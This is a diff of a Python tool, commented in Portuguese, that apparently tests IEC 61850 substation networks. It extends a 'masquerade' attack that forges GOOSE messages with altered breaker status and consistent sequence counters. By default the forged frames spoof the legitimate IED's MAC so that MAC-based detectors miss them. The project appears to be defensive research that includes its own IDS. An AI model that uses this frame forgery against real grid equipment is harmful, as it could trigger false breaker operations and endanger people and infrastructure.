@@ -105,9 +105,16 @@ def cmd_replay(args):
 
 def cmd_masquerade(args):
     """Teste C — Masquerade/Insertion: forja uma nova mensagem no mesmo
-    gocbRef/MAC do IED legítimo, com um valor de estado alterado (ex.:
+    gocbRef do IED legítimo, com um valor de estado alterado (ex.:
     status de disjuntor) e stNum/sqNum/t consistentes com uma mudança de
-    estado real, para que o assinante aceite como legítima."""
+    estado real, para que o assinante aceite como legítima.
+
+    Por padrão, usa o MESMO MAC de origem do IED legítimo (--src-mac não
+    informado) — simula um atacante sofisticado que também falsifica o
+    MAC, indistinguível de uma mudança de estado real para um detector
+    baseado só em anomalia de endereço. Passe --src-mac pra simular um
+    atacante menos cuidadoso, que usa o próprio MAC (nesse caso, um IDS
+    baseado em mudança de MAC — como o ids/ deste projeto — detecta)."""
     parsed = _load_template(args.template)
     fields = dict(parsed["fields"])
     allData = fields["allData"]
@@ -120,13 +127,16 @@ def cmd_masquerade(args):
     fields["sqNum"] = 0                     # reinicia sequência após stNum
     fields["t"] = gf.make_utctime()
 
+    src_mac = args.src_mac if args.src_mac else parsed["src_mac"]
     pkt = gf.build_ethernet_goose_frame(
-        dst_mac=parsed["dst_mac"], src_mac=parsed["src_mac"],
+        dst_mac=parsed["dst_mac"], src_mac=src_mac,
         appid=parsed["appid"], fields=fields,
     )
     print(f"[*] Masquerade: gocbRef={fields['gocbRef']} "
           f"bit em offset {offset} do allData: {old_val} -> {new_val}, "
-          f"stNum {parsed['fields']['stNum']} -> {fields['stNum']}")
+          f"stNum {parsed['fields']['stNum']} -> {fields['stNum']}, "
+          f"src_mac={src_mac}"
+          f"{' (falsificado, atacante sofisticado)' if src_mac == parsed['src_mac'] else ' (MAC próprio, atacante ingênuo)'}")
     if args.dry_run:
         print("[dry-run] pacote forjado, tamanho:", len(bytes(pkt)))
     else:
@@ -189,6 +199,11 @@ def main():
     p_masq.add_argument("--template", required=True)
     p_masq.add_argument("--occurrence", type=int, default=0,
                          help="Qual valor booleano do allData inverter (0 = primeiro).")
+    p_masq.add_argument("--src-mac", default=None,
+                         help="MAC de origem a usar. Sem essa flag, usa o mesmo MAC "
+                              "do molde (atacante sofisticado, não detectável só por "
+                              "mudança de MAC). Com essa flag, simula um atacante "
+                              "menos cuidadoso (detectável).")
     p_masq.set_defaults(func=cmd_masquerade)
 
     p_supp = sub.add_parser("suppress", help="Teste D - Suppression.")
@@ -203,3 +218,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
